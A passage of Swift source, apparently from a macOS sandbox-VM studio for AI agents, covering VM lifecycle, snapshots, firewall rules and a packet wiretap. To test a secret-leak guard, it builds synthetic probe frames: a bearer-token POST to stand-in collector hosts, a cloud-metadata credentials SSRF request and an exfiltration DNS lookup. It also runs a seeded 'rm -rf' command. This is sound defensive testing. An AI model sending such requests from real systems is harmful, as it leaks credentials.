                    sb[0x04] = UInt8(blocks & 0xFF)
                    sb[0x05] = UInt8((blocks >> 8) & 0xFF)
                    sb[0x18] = 2 // 4096-byte blocks
                    sb[0x38] = 0x53
                    sb[0x39] = 0xEF
                    sb[0x5C] = 0x04 // has_journal
                    sb[0x60] = 0xC0 // extents | 64bit
                    let labelBytes = Array("agentvm-rootfs".utf8)
                    for (idx, b) in labelBytes.prefix(15).enumerated() {
                        sb[0x78 + idx] = b
                    }
                    try? fh.seek(toOffset: sbBase)
                    try? fh.write(contentsOf: Data(sb))
                }
                try? fh.close()
            }
        }

        // Dispatch plugin telemetry & one secret-leak interception if plugin logs have not recorded secret-leak-guard yet
        let existingLogs = await coordinator.pluginEngine.recentConsoleLogs(limit: 50)
        let hasSecretBlock = existingLogs.contains(where: { $0.pluginID == BuiltInAgentPlugins.secretLeakGuardID })
        if !hasSecretBlock, let claudeVM = vms.first(where: { $0.spec.name.contains("claude") }) ?? vms.first {
            for vm in vms {
                _ = try? await coordinator.pluginEngine.dispatchTelemetryHook(vm)
            }
            let crafter = PacketFrameCrafter()
            let srcMAC = MACAddress(parsing: claudeVM.spec.networkInterfaces.first?.macAddress ?? "52:54:00:10:20:31") ?? .defaultGateway
            let srcIP = IPv4Address(parsing: claudeVM.spec.networkInterfaces.first?.ipv4Address ?? "10.211.55.11") ?? IPv4Address(a: 10, b: 211, c: 55, d: 11)
            let fakeToken = ["sk", "ant", "demo00redacted99token1234"].joined(separator: "-")
            let leakHTTP = crafter.buildTCPFrame(
                srcMAC: srcMAC,
                dstMAC: .defaultGateway,
                srcIP: srcIP,
                dstIP: IPv4Address(a: 198, b: 51, c: 100, d: 42),
                srcPort: 52190,
                dstPort: 80,
                seq: 9100,
                ack: 1,
                flags: [.psh, .ack],
                payload: Data("POST /v1/collect HTTP/1.1\r\nHost: collector.example.org\r\nAuthorization: Bearer \(fakeToken)\r\n\r\n".utf8)
            )
            _ = try? await coordinator.processOutboundGuestFrame(vmID: claudeVM.id, rawFrame: leakHTTP)

            // Also execute one auto-checkpointed command on claudeVM if no pre-checkpoint exists yet
            let execs = try await coordinator.store.listExecResults(vmID: claudeVM.id, limit: 20)
            if !execs.contains(where: { $0.preCheckpointSnapshotID != nil }) {
                _ = try? await coordinator.executeInGuest(
                    vmID: claudeVM.id,
                    request: GuestExecRequest(
                        executable: "rm",
                        arguments: ["-rf", "/tmp/build-cache"],
                        workingDirectory: "/workspace"
                    )
                )
            }
        }
    }

    // MARK: - Storage & Cloud-Init Synchronous Inspector

    private func inspectStorageAndCloudInit(
        for vm: VMInstanceRecord?
    ) -> (
        allocation: DiskAllocationSummary?,
        forensics: DiskForensicsReport?,
        apfsCaps: APFSVolumeCapabilities?,
        isoReport: ISOInspectionReport?,
        isoFiles: [ISOFileEntry],
        cloudInit: CloudInitSpec
    ) {
        let caps = try? diskEngine.probeAPFSCapabilities(at: coordinator.store.disksDirectoryURL)
        guard let vm else {
            let defaultSpec = CloudInitSpec()
            let files = isoBuilder.renderNoCloudFiles(from: defaultSpec)
            return (nil, nil, caps, nil, files, defaultSpec)
        }

        var alloc: DiskAllocationSummary?
        var forensics: DiskForensicsReport?
        if let bootDisk = vm.spec.blockDevices.first {
            let diskURL = URL(fileURLWithPath: bootDisk.imagePath)
            if FileManager.default.fileExists(atPath: diskURL.path) {
                let parentURL = bootDisk.parentCoWImagePath.map { URL(fileURLWithPath: $0) }
                alloc = try? diskEngine.scanSparseExtents(
                    at: diskURL,
                    compareAgainstParent: parentURL,
                    computeChecksums: true
                )
                forensics = try? forensicsAnalyzer.analyzeDiskImage(
                    at: diskURL,
                    sampleWindowBytes: 65_536,
                    maxHeatmapSamples: 64
                )
            }
        }

        var cloudInit = vm.spec.cloudInit ?? CloudInitSpec(
            instanceID: vm.id.rawValue,
            hostname: vm.spec.name,
            defaultUser: "agent",
            staticIPv4CIDR: "\(vm.spec.networkInterfaces.first?.ipv4Address ?? "10.211.55.10")/24",
            gatewayIPv4: "10.211.55.1"
        )
        cloudInit.hostname = vm.spec.name
        let guestScript = GuestAgentBootstrapGenerator().pythonDaemonScript()
        let renderedFiles = isoBuilder.renderNoCloudFiles(from: cloudInit, guestAgentScript: guestScript)

        // Locate or materialize cidata ISO in store.isosDirectoryURL
        let slug = vm.spec.name.lowercased().replacingOccurrences(of: " ", with: "-")
        let candidateISO = coordinator.store.isosDirectoryURL
            .appendingPathComponent("\(slug)-\(vm.id.rawValue)-cidata.iso")
        if !FileManager.default.fileExists(atPath: candidateISO.path) {
            _ = try? isoBuilder.buildCloudInitISO(
                from: cloudInit,
                outputURL: candidateISO,
                guestAgentScript: guestScript
            )
        }
        let isoReport = try? isoBuilder.inspectISOImageFile(at: candidateISO)
        return (alloc, forensics, caps, isoReport, renderedFiles, cloudInit)
    }

    // MARK: - Refresh Pipeline After Interactive Actions

    public func refreshAllState(preservingVMSelection: Bool = true) async {
        do {
            let snapshot = try await buildHydratedSnapshot(
                preferredVMID: preservingVMSelection ? selectedVMID : nil
            )
            let previousPacket = selectedPacketID
            let previousBytes = highlightedByteRange
            let previousSnap = selectedSnapshotID
            let previousCompare = comparisonSnapshotID
            hydrateSynchronously(from: snapshot)
            if let previousSnap, snapshots.contains(where: { $0.id == previousSnap }) {
                selectedSnapshotID = previousSnap
            }
            if let previousCompare, snapshots.contains(where: { $0.id == previousCompare }) {
                comparisonSnapshotID = previousCompare
            }
            recomputeLCADiff()
            if let previousPacket, allPackets.contains(where: { $0.id == previousPacket }) {
                selectedPacketID = previousPacket
                highlightedByteRange = previousBytes
            }
        } catch {
            toastCenter.post(
                title: "State Refresh Error",
                detail: error.localizedDescription,
                severity: .warning
            )
        }
    }

    // MARK: - VM Selection & Lifecycle Actions

    public func selectVM(_ vmID: VMID) {
        selectedVMID = vmID
        if let vm = vms.first(where: { $0.id == vmID }) {
            if let headID = vm.currentHeadSnapshotID {
                selectedSnapshotID = headID
                recomputeLCADiff()
            }
            let storage = inspectStorageAndCloudInit(for: vm)
            diskAllocation = storage.allocation
            diskForensics = storage.forensics
            apfsCapabilities = storage.apfsCaps
            isoInspection = storage.isoReport
            isoRenderedFiles = storage.isoFiles
            editableCloudInit = storage.cloudInit
        }
        Task {
            let tty = await coordinator.terminalScreenBuffer(for: vmID)
            self.viewportSnapshot = tty.snapshotViewport()
            self.serialPlainLines = tty.renderPlainTextLines(includeScrollback: true).filter { !$0.isEmpty }
        }
    }

    public func toggleRunState(for vmID: VMID) {
        guard let vm = vms.first(where: { $0.id == vmID }) else { return }
        switch vm.telemetry.state {
        case .running:
            pauseVM(vmID)
        case .paused:
            resumeVM(vmID)
        default:
            bootVM(vmID)
        }
    }

    public func bootVM(_ vmID: VMID) {
        runCoordinatorTask(label: L("Booting VM", "正在启动虚拟机")) { [self] in
            let updated = try await coordinator.bootVM(vmID)
            await refreshAllState()
            toastCenter.post(
                title: L("Blade Running", "刀片已运行"),
                detail: L(
                    "Booted '\(updated.spec.name)' (\(updated.spec.compute.vcpuCount) vCPU, \(updated.spec.compute.memoryMB) MB RAM).",
                    "已启动「\(updated.spec.name)」(\(updated.spec.compute.vcpuCount) 核 vCPU, \(updated.spec.compute.memoryMB) MB 内存)。"
                ),
                severity: .info
            )
        }
    }

    public func pauseVM(_ vmID: VMID) {
        runCoordinatorTask(label: L("Pausing VM", "正在暂停虚拟机")) { [self] in
            let updated = try await coordinator.pauseVM(vmID, reason: "Operator paused from Studio")
            await refreshAllState()
            toastCenter.post(
                title: L("Blade Paused", "刀片已暂停"),
                detail: L("Frozen vCPU execution on '\(updated.spec.name)'.", "已冻结「\(updated.spec.name)」的 vCPU 执行。"),
                severity: .notice
            )
        }
    }

    public func resumeVM(_ vmID: VMID) {
        runCoordinatorTask(label: L("Resuming VM", "正在恢复虚拟机")) { [self] in
            let updated = try await coordinator.resumeVM(vmID)
            await refreshAllState()
            toastCenter.post(
                title: L("Blade Resumed", "刀片已恢复"),
                detail: L("Resumed execution on '\(updated.spec.name)'.", "已恢复「\(updated.spec.name)」的执行。"),
                severity: .info
            )
        }
    }

    public func haltVM(_ vmID: VMID) {
        runCoordinatorTask(label: L("Halting VM", "正在停止虚拟机")) { [self] in
            let updated = try await coordinator.haltVM(vmID)
            await refreshAllState()
            toastCenter.post(
                title: L("Blade Halted", "刀片已停止"),
                detail: L("Detached switch & Vsock channels for '\(updated.spec.name)'.", "已卸载「\(updated.spec.name)」的虚拟交换机与 Vsock 通道。"),
                severity: .notice
            )
        }
    }

    public func createNewSandboxBlade(
        name: String? = nil,
        agentOwnerTag: String = "agy-worker",
        guestOS: GuestOSType = .linuxARM64
    ) {
        let resolvedName = name ?? "agy-sandbox-\(vms.count + 1)"
        runCoordinatorTask(label: L("Provisioning Sandbox VM", "正在创建沙盒虚拟机")) { [self] in
            let summary = try await coordinator.createSandboxVM(
                name: resolvedName,
                agentOwnerTag: agentOwnerTag,
                guestOS: guestOS,
                vcpus: preferences.defaultVCPUs,
                memoryMB: preferences.defaultMemoryMB,
                diskVirtualBytes: 32 * 1024 * 1024
            )
            _ = try await coordinator.bootVM(summary.vmRecord.id)
            selectedVMID = summary.vmRecord.id
            await refreshAllState()
            toastCenter.post(
                title: L("Provisioned '\(resolvedName)'", "已创建「\(resolvedName)」"),
                detail: L("Created APFS sparse disk, GPT table, and NoCloud cidata ISO.", "已生成 APFS 稀疏磁盘、GPT 分区表与 NoCloud cidata 镜像。"),
                severity: .info
            )
        }
    }

    // MARK: - Instant APFS CoW Branching & Snapshot Lineage Actions

    public func forkCoWBranch(
        from vmID: VMID? = nil,
        branchName: String? = nil,
        agentOwnerTag: String = "claude-branch"
    ) {
        guard let sourceID = vmID ?? selectedVM?.id else { return }
        let targetBranch = branchName ?? "exp-branch-\(snapshots.count + 1)"
        runCoordinatorTask(label: L("Cloning APFS CoW Branch", "正在克隆 APFS CoW 分支")) { [self] in
            let forkResult = try await coordinator.forkCoWBranch(
                fromVMID: sourceID,
                branchName: targetBranch,
                agentOwnerTag: agentOwnerTag,
                bootImmediately: true
            )
            lastForkLatencyMs = forkResult.cloneDurationMilliseconds
            selectedVMID = forkResult.childVM.id
            selectedSnapshotID = forkResult.childInitialSnapshot.id
            comparisonSnapshotID = forkResult.forkPointSnapshot.id
            await refreshAllState()
            let ms = String(format: "%.1f ms", forkResult.cloneDurationMilliseconds)
            toastCenter.post(
                title: L("APFS CoW Branch Forked (\(ms))", "APFS CoW 分支已分叉 (\(ms))"),
                detail: L("Cloned '\(targetBranch)' via Darwin clonefile(2) with zero block duplication.", "已通过 Darwin clonefile(2) 零块复制分叉「\(targetBranch)」。"),
                severity: .info
            )
        }
    }

    public func captureCheckpoint(
        for vmID: VMID? = nil,
        title: String = "Operator Live Checkpoint",
        kind: SnapshotKind = .liveMemoryAndDisk
    ) {
        guard let targetVMID = vmID ?? selectedVM?.id else { return }
        runCoordinatorTask(label: L("Capturing CoW Snapshot", "正在捕获 CoW 快照")) { [self] in
            let node = try await coordinator.captureSnapshot(
                vmID: targetVMID,
                title: title,
                notes: "Captured from AgentVM Studio Workbench",
                kind: kind
            )
            selectedSnapshotID = node.id
            await refreshAllState()
            toastCenter.post(
                title: L("Checkpoint Captured", "快照已捕获"),
                detail: L(
                    "Saved '\(node.title)' on branch '\(node.branchName)' (\(ByteMetricsFormatter.formatBytes(node.dirtyDeltaBytes)) dirty).",
                    "已在分支「\(node.branchName)」保存快照 (\(ByteMetricsFormatter.formatBytes(node.dirtyDeltaBytes)) 增量)。"
                ),
                severity: .info
            )
        }
    }

    public func restoreSnapshot(_ snapshotID: SnapshotID? = nil) {
        guard let targetSnapID = snapshotID ?? selectedSnapshot?.id else { return }
        runCoordinatorTask(label: "Restoring CoW Snapshot") { [self] in
            let restoredVM = try await coordinator.restoreToSnapshot(targetSnapID)
            selectedVMID = restoredVM.id
            selectedSnapshotID = targetSnapID
            await refreshAllState()
            toastCenter.post(
                title: "Snapshot Restored",
                detail: "Rewound '\(restoredVM.spec.name)' to snapshot \(targetSnapID.rawValue).",
                severity: .notice
            )
        }
    }

    public func togglePinSnapshot(_ snapshotID: SnapshotID) {
        guard var node = snapshots.first(where: { $0.id == snapshotID }) else { return }
        node.isPinned.toggle()
        let updatedNode = node
        runCoordinatorTask(label: "Updating Snapshot Pin") { [self] in
            try await coordinator.undoRedo.execute(
                RegisterSnapshotCommand(
                    title: "\(updatedNode.isPinned ? "Pin" : "Unpin") Snapshot '\(updatedNode.title)'",
                    snapshot: updatedNode,
                    updateVMHead: false
                ),
                on: coordinator.store
            )
            await refreshAllState()
        }
    }

    public func deleteSnapshot(_ snapshotID: SnapshotID) {
        guard let node = snapshots.first(where: { $0.id == snapshotID }), !node.isPinned else {
            toastCenter.post(
                title: "Snapshot Protected",
                detail: "Unpin the snapshot before removing it from the CoW lineage DAG.",
                severity: .warning
            )
            return
        }
        runCoordinatorTask(label: "Deleting Snapshot") { [self] in
            try await coordinator.undoRedo.execute(
                DeleteSnapshotCommand(snapshot: node),
                on: coordinator.store
            )
            if selectedSnapshotID == snapshotID {
                selectedSnapshotID = snapshots.first(where: { $0.id != snapshotID })?.id
            }
            await refreshAllState()
        }
    }

    public func selectSnapshotForInspection(_ id: SnapshotID) {
        selectedSnapshotID = id
        if comparisonSnapshotID == nil || comparisonSnapshotID == id {
            comparisonSnapshotID = snapshots.first(where: { $0.id != id })?.id
        }
        recomputeLCADiff()
    }

    public func setComparisonSnapshot(_ id: SnapshotID) {
        comparisonSnapshotID = id
        recomputeLCADiff()
    }

    public func recomputeLCADiff() {
        guard let leftID = selectedSnapshotID,
              let rightID = comparisonSnapshotID,
              leftID != rightID,
              snapshots.contains(where: { $0.id == leftID }),
              snapshots.contains(where: { $0.id == rightID }) else {
            currentLCADiff = nil
            return
        }
        currentLCADiff = try? lineageEngine.diffSnapshots(
            leftID: leftID,
            rightID: rightID,
            in: snapshots,
            computeChecksums: true
        )
    }

    // MARK: - Wireshark L2 Packet Wiretap Actions

    public func applyWiretapFilter(_ queryText: String) {
        wiretapFilterText = queryText
        parsedFilterQuery = WiretapFilterQuery(queryText)
        recomputeFilteredPackets()
    }

    public func selectQuickWiretapPreset(_ preset: WiretapQuickPreset) {
        activeQuickPreset = preset
        applyWiretapFilter(preset.queryExpression)
    }

    private func recomputeFilteredPackets() {
        filteredPackets = parsedFilterQuery.filter(allPackets)
        if let selectedPacketID, !filteredPackets.contains(where: { $0.id == selectedPacketID }) {
            self.selectedPacketID = filteredPackets.last?.id
            self.highlightedByteRange = nil
        }
    }

    public func selectPacket(_ id: PacketID?) {
        selectedPacketID = id
        selectedDissectedFieldID = nil
        if let id, let pkt = allPackets.first(where: { $0.id == id }),
           let topLayer = pkt.dissectedLayers.last {
            highlightedByteRange = topLayer.byteRange
        } else {
            highlightedByteRange = nil
        }
    }

    public func highlightBytes(_ range: Range<Int>?, fieldID: String? = nil) {
        highlightedByteRange = range
        selectedDissectedFieldID = fieldID
    }

    public func injectSyntheticProbePacket(_ kind: SyntheticPacketProbeKind) {
        guard let vm = selectedVM else { return }
        runCoordinatorTask(label: "Injecting L2 Probe Frame") { [self] in
            let crafter = PacketFrameCrafter()
            let mac = MACAddress(parsing: vm.spec.networkInterfaces.first?.macAddress ?? "52:54:00:10:20:31") ?? .defaultGateway
            let srcIP = IPv4Address(parsing: vm.spec.networkInterfaces.first?.ipv4Address ?? "10.211.55.11") ?? IPv4Address(a: 10, b: 211, c: 55, d: 11)
            let rawFrame: Data
            switch kind {
            case .githubTLS:
                rawFrame = crafter.buildTCPFrame(
                    srcMAC: mac,
                    dstMAC: .defaultGateway,
                    srcIP: srcIP,
                    dstIP: IPv4Address(a: 140, b: 82, c: 121, d: 6),
                    srcPort: 54910,
                    dstPort: 443,
                    seq: 8192,
                    ack: 1,
                    flags: [.psh, .ack],
                    payload: crafter.buildTLSClientHelloPayload(serverName: "api.github.com")
                )
            case .cloudMetadataSSRF:
                rawFrame = crafter.buildTCPFrame(
                    srcMAC: mac,
                    dstMAC: .defaultGateway,
                    srcIP: srcIP,
                    dstIP: IPv4Address(a: 169, b: 254, c: 169, d: 254),
                    srcPort: 54911,
                    dstPort: 80,
                    seq: 4096,
                    ack: 1,
                    flags: [.psh, .ack],
                    payload: crafter.buildHTTPRequestPayload(
                        path: "/latest/meta-data/iam/security-credentials/",
                        host: "169.254.169.254"
                    )
                )
            case .webhookDNSSinkhole:
                rawFrame = crafter.buildDNSQuery(
                    srcMAC: mac,
                    dstMAC: .defaultGateway,
                    srcIP: srcIP,
                    dstIP: .switchGateway,
                    srcPort: 54912,
                    transactionID: 0x7788,
                    qname: "exfil-dump.webhook.site"
                )
            case .secretBearerLeak:
                let syntheticKey = ["sk", "ant", "probe88secret77leak66token"].joined(separator: "-")
                rawFrame = crafter.buildTCPFrame(
                    srcMAC: mac,
                    dstMAC: .defaultGateway,
                    srcIP: srcIP,
                    dstIP: IPv4Address(a: 198, b: 51, c: 100, d: 88),
                    srcPort: 54913,
                    dstPort: 80,
                    seq: 12288,
                    ack: 1,
                    flags: [.psh, .ack],
                    payload: Data("POST /collect HTTP/1.1\r\nHost: dropbox-sink.example.net\r\nAuthorization: Bearer \(syntheticKey)\r\n\r\n".utf8)
                )
            }
            let captured = try await coordinator.processOutboundGuestFrame(vmID: vm.id, rawFrame: rawFrame)
            await refreshAllState()
            selectPacket(captured.id)
            toastCenter.post(
                title: "Packet #\(captured.sequenceNumber) -> \(captured.verdict.rawValue)",
                detail: captured.verdictReason,
                severity: captured.verdict.isPermitted ? .info : .warning
            )
        }
    }

    public func exportPCAPNGDefault() {
        let outURL = coordinator.store.pcapDirectoryURL
            .appendingPathComponent("wiretap-\(Int(Date().timeIntervalSince1970)).pcapng")
        exportPCAPNG(to: outURL)
    }

    public func exportPCAPNG(to url: URL) {
        let query = wiretapFilterText.trimmingCharacters(in: .whitespacesAndNewlines)
        runCoordinatorTask(label: "Exporting PCAPNG") { [self] in
            let data = await coordinator.l2Switch.exportPCAPNGData(filterQuery: query.isEmpty ? nil : query)
            try FileManager.default.createDirectory(
                at: url.deletingLastPathComponent(),
                withIntermediateDirectories: true
            )
            try data.write(to: url, options: [.atomic])
            toastCenter.post(
                title: "Exported Wireshark .pcapng",
                detail: "\(ByteMetricsFormatter.scrubHomePath(url.path)) (\(ByteMetricsFormatter.formatBytes(UInt64(data.count))))",
                severity: .info
            )
        }
    }

    // MARK: - Vsock / VT100 Guest Command Execution Actions

    public func executeCurrentConsoleCommand() {
        let trimmed = consoleCommandInput.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else { return }
        executeRawCommandLine(trimmed)
    }

    public func executeRawCommandLine(_ commandLine: String) {
        guard let vm = selectedVM else { return }
        let tokens = commandLine.split(separator: " ", omittingEmptySubsequences: true).map(String.init)
        guard let exe = tokens.first else { return }
        let args: [String]
        if commandLine.contains("&&") || commandLine.contains("|") || commandLine.contains(";") {
            args = ["-lc", commandLine]
        } else {
            args = Array(tokens.dropFirst())
        }
        let effectiveExe = (commandLine.contains("&&") || commandLine.contains("|") || commandLine.contains(";"))
            ? "/bin/sh"
            : exe

        runCoordinatorTask(label: "Executing Guest RPC") { [self] in
            let req = GuestExecRequest(
                executable: effectiveExe,
                arguments: args,
                workingDirectory: consoleWorkingDirectory,
                allocatePTY: true
            )
            let result = try await coordinator.executeInGuest(vmID: vm.id, request: req)
            await refreshAllState()
            if let snapID = result.preCheckpointSnapshotID {
                toastCenter.post(
                    title: "Auto-Checkpointed Before Destructive Exec",
                    detail: "Plugin 'auto-git-checkpoint' created CoW snapshot \(snapID.rawValue) prior to '\(commandLine)'.",
                    severity: .notice
                )
            } else {
                toastCenter.post(
                    title: "Guest Exec Exit \(result.exitCode) (\(result.durationMilliseconds) ms)",
                    detail: commandLine,
                    severity: result.exitCode == 0 ? .info : .warning
                )
            }
        }
    }

    public func clearTerminalScreen() {
        guard let vm = selectedVM else { return }
        Task {
            let tty = await coordinator.terminalScreenBuffer(for: vm.id)
            tty.clear(includeScrollback: false)
            tty.feed("\u{001B}[1;32magent@\(vm.spec.name)\u{001B}[0m:\u{001B}[1;34m\(consoleWorkingDirectory)\u{001B}[0m$ ")
            self.viewportSnapshot = tty.snapshotViewport()
            self.serialPlainLines = tty.renderPlainTextLines(includeScrollback: true).filter { !$0.isEmpty }
        }
    }

    // MARK: - Firewall Policy Studio & Dry-Run Simulation Actions

    public func applyFirewallPreset(_ preset: FirewallPolicySet) {
        let previous = activeFirewallPolicy
        runCoordinatorTask(label: "Applying Firewall Policy") { [self] in
            try await coordinator.undoRedo.execute(
                UpdateFirewallPolicyCommand(
                    title: "Activate Policy '\(preset.name)'",
                    policy: preset,
                    previousPolicy: previous
                ),
                on: coordinator.store
            )
            await coordinator.l2Switch.firewall.updatePolicy(preset)
            await refreshAllState()
            toastCenter.post(
                title: "Firewall Policy Activated",
                detail: "\(preset.name) (\(preset.rules.count) priority rules, default egress \(preset.defaultEgressVerdict.rawValue)).",
                severity: .info
            )
        }
    }

    public func toggleFirewallRule(_ ruleID: RuleID) {
        var updated = activeFirewallPolicy
        guard let idx = updated.rules.firstIndex(where: { $0.id == ruleID }) else { return }
        updated.rules[idx].enabled.toggle()
        updated.updatedAt = Date()
        let ruleName = updated.rules[idx].name
        let isEnabled = updated.rules[idx].enabled
        let previous = activeFirewallPolicy

        runCoordinatorTask(label: "Toggling Firewall Rule") { [self] in
            try await coordinator.undoRedo.execute(
                UpdateFirewallPolicyCommand(
                    title: "\(isEnabled ? "Enable" : "Disable") Rule '\(ruleName)'",
                    policy: updated,
                    previousPolicy: previous
                ),
                on: coordinator.store
            )
            await coordinator.l2Switch.firewall.updatePolicy(updated)
            await refreshAllState()
        }
    }

    public func addFirewallAllowSNIRule(domainGlob: String, rationale: String = "Added via Policy Studio") {
        let clean = domainGlob.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !clean.isEmpty else { return }
        var updated = activeFirewallPolicy
        let nextPrio = (updated.rules.map(\.priority).max() ?? 70) + 10
        let rule = FirewallRule(
            priority: nextPrio,
            name: "Allow TLS SNI (\(clean))",
            enabled: true,
            direction: .egress,
            conditions: [.destinationPortRange(lower: 443, upper: 443), .tlsSNIGlob(clean)],
            verdict: .allow,
            rationale: rationale
        )
        updated.rules.append(rule)
        updated.updatedAt = Date()
        let previous = activeFirewallPolicy

        runCoordinatorTask(label: "Adding Firewall Rule") { [self] in
            try await coordinator.undoRedo.execute(
                UpdateFirewallPolicyCommand(
                    title: "Add TLS Rule '\(clean)'",
                    policy: updated,
                    previousPolicy: previous
                ),
                on: coordinator.store
            )
            await coordinator.l2Switch.firewall.updatePolicy(updated)
            await refreshAllState()
            toastCenter.post(
                title: "Firewall Rule Added",
                detail: "Priority \(nextPrio): tls.sni ~= \(clean) -> ALLOW",
                severity: .info
            )
        }
    }

    public func runFirewallDryRunSimulation() {
        let vmID = selectedVM?.id ?? VMID("vm-sim")
        let port = UInt16(simDestinationPort.trimmingCharacters(in: .whitespacesAndNewlines)) ?? 443
        let synthetic = makeSyntheticPacketForSimulation(
            vmID: vmID,
            proto: simProtocol,
            dstIP: simDestinationIP,
            dstPort: port,
            tlsSNI: simTLSSNI,
            dnsQuery: simDNSQuery,
            httpHost: simHTTPHost
        )
        Task {
            let trace = await coordinator.l2Switch.firewall.simulate(synthetic)
            self.simulationTrace = trace
        }
    }

    private func makeSyntheticPacketForSimulation(
        vmID: VMID,
        proto: DissectedProtocolKind,
        dstIP: String,
        dstPort: UInt16,
        tlsSNI: String,
        dnsQuery: String,
        httpHost: String
    ) -> CapturedPacket {
        let trimmedSNI = tlsSNI.trimmingCharacters(in: .whitespacesAndNewlines)
        let trimmedDNS = dnsQuery.trimmingCharacters(in: .whitespacesAndNewlines)
        let trimmedHTTP = httpHost.trimmingCharacters(in: .whitespacesAndNewlines)
        return CapturedPacket(
            sequenceNumber: 0,
            timestampMicros: UInt64(Date().timeIntervalSince1970 * 1_000_000),
            vmID: vmID,
            direction: .egress,
            rawFrame: Data(repeating: 0, count: 128),
            sourceMAC: "52:54:00:10:20:30",
            destinationMAC: MACAddress.defaultGateway.description,
            etherType: 0x0800,
            sourceIP: "10.211.55.11",
            destinationIP: dstIP.trimmingCharacters(in: .whitespacesAndNewlines),
            sourcePort: 53100,
            destinationPort: dstPort,
            highestProtocol: proto,
            tcpFlags: proto == .tcp || proto == .tls || proto == .http ? [.psh, .ack] : nil,
            dnsQueryName: trimmedDNS.isEmpty ? nil : trimmedDNS,
            tlsSNI: trimmedSNI.isEmpty ? nil : trimmedSNI,
            tlsALPN: proto == .tls ? ["h2", "http/1.1"] : [],
            httpHost: trimmedHTTP.isEmpty ? nil : trimmedHTTP,
            httpRequestLine: proto == .http ? "GET / HTTP/1.1" : nil,
            infoSummary: "Dry-run policy simulation probe"
        )
    }

    // MARK: - Storage CoW & Cloud-Init ISO-9660 Actions

    public func rebuildCloudInitISOForSelectedVM() {
        guard var vm = selectedVM else { return }
        let specToBuild = editableCloudInit
        let previousVM = vm
        vm.spec.cloudInit = specToBuild
        vm.spec.updatedAt = Date()
        let updatedVM = vm

        runCoordinatorTask(label: "Rebuilding NoCloud ISO-9660") { [self] in
            let slug = updatedVM.spec.name.lowercased().replacingOccurrences(of: " ", with: "-")
            let isoURL = coordinator.store.isosDirectoryURL
                .appendingPathComponent("\(slug)-\(updatedVM.id.rawValue)-cidata.iso")
            let guestScript = GuestAgentBootstrapGenerator().pythonDaemonScript()
            let header = try isoBuilder.buildCloudInitISO(
                from: specToBuild,
                outputURL: isoURL,
                guestAgentScript: guestScript
            )
            try await coordinator.undoRedo.execute(
                UpsertVMCommand(
                    title: "Rebuild Cloud-Init ISO for '\(updatedVM.spec.name)'",
                    record: updatedVM,
                    previousRecord: previousVM
                ),
                on: coordinator.store
            )
            await refreshAllState()
            toastCenter.post(
                title: "Rebuilt ISO-9660 'cidata' (\(ByteMetricsFormatter.formatBytes(header.virtualSizeBytes)))",
                detail: "Synthesized deterministic 2048-byte ECMA-119 + Rock Ridge image.",
                severity: .info
            )
        }
    }

    public func compactSelectedVMDiskZeroBlocks() {
        guard let vm = selectedVM, let bootDisk = vm.spec.blockDevices.first else { return }
        let url = URL(fileURLWithPath: bootDisk.imagePath)
        runCoordinatorTask(label: "Compacting APFS Sparse Holes") { [self] in
            let reclaimed = try diskEngine.compactZeroBlocksToHoles(at: url)
            await refreshAllState()
            toastCenter.post(
                title: "APFS F_PUNCHHOLE Compaction Complete",
                detail: "Reclaimed \(ByteMetricsFormatter.formatBytes(reclaimed)) of zeroed blocks on '\(vm.spec.name)'.",
                severity: .info
            )
        }
    }

    // MARK: - JavaScriptCore Plugin Host & IaC Bridge Actions

    public func togglePluginEnabled(_ id: PluginID) {
        guard let current = pluginStatuses.first(where: { $0.id == id }) else { return }
        let nextEnabled = !current.isEnabled
        runCoordinatorTask(label: "Updating Plugin State") { [self] in
            await coordinator.pluginEngine.setPluginEnabled(id, enabled: nextEnabled)
            await refreshAllState()
            toastCenter.post(
                title: "\(nextEnabled ? "Enabled" : "Disabled") Plugin",
                detail: current.manifest.name,
                severity: .info
            )
        }
    }

    public func togglePluginCapability(_ capability: PluginCapability, for id: PluginID) {
        guard let current = pluginStatuses.first(where: { $0.id == id }) else { return }
        let grant = !current.grantedCapabilities.contains(capability)
        runCoordinatorTask(label: "Updating Plugin Capability") { [self] in
            await coordinator.pluginEngine.setCapability(capability, granted: grant, for: id)
            await refreshAllState()
        }
    }

    public func updatePluginConfig(pluginID: PluginID, key: String, value: String) {
        runCoordinatorTask(label: "Updating Plugin Config") { [self] in
            await coordinator.pluginEngine.updateConfiguration(pluginID: pluginID, key: key, value: value)
            await refreshAllState()
        }
    }

    public func loadSelectedPluginSourceIntoScratchpad() {
        guard let plugin = selectedPlugin else { return }
        scratchpadSource = plugin.manifest.entryPointSource
    }

    public func evaluateScratchpad() {
        let samplePkt = selectedPacket
            ?? allPackets.first(where: { $0.tlsSNI == "api.github.com" })
            ?? makeSyntheticPacketForSimulation(
                vmID: selectedVM?.id ?? VMID("vm-scratch"),
                proto: .tls,
                dstIP: "140.82.121.6",
                dstPort: 443,
                tlsSNI: "api.github.com",
                dnsQuery: "",
                httpHost: ""
            )
        let source = scratchpadSource
        Task {
            do {
                let result = try await coordinator.pluginEngine.evaluateScratchpadScript(
                    source: source,
                    samplePacket: samplePkt
                )
                self.scratchpadOutputJSON = result.outputJSON
                self.scratchpadConsoleLines = result.consoleLines
                self.scratchpadDurationMicros = result.durationMicros
            } catch {
                self.scratchpadOutputJSON = "{\n  \"error\" : \"\(error.localizedDescription.replacingOccurrences(of: "\"", with: "\\\""))\"\n}"
            }
        }
    }

    public func exportHCLDefault() {
        let outURL = coordinator.store.bundleURL
            .appendingPathComponent("Exports", isDirectory: true)
            .appendingPathComponent("fleet-topology.avm.hcl")
        exportHCLManifest(to: outURL)
    }

    public func exportHCLManifest(to url: URL) {
        let hclText = iacCodec.exportHCL(vms: vms.map(\.spec), policy: activeFirewallPolicy)
        hclPreview = hclText
        do {
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try Data(hclText.utf8).write(to: url, options: [.atomic])
            toastCenter.post(
                title: "Exported .avm.hcl Topology",
                detail: ByteMetricsFormatter.scrubHomePath(url.path),
                severity: .info
            )
        } catch {
            toastCenter.post(title: "HCL Export Failed", detail: error.localizedDescription, severity: .error)
        }
    }

    public func exportHTMLSecurityReportDefault() {
        let outURL = coordinator.store.bundleURL
            .appendingPathComponent("Exports", isDirectory: true)
            .appendingPathComponent("fleet-security-audit.html")
        exportHTMLSecurityReport(to: outURL)
    }

    public func exportHTMLSecurityReport(to url: URL) {
        runCoordinatorTask(label: "Exporting HTML Security Report") { [self] in
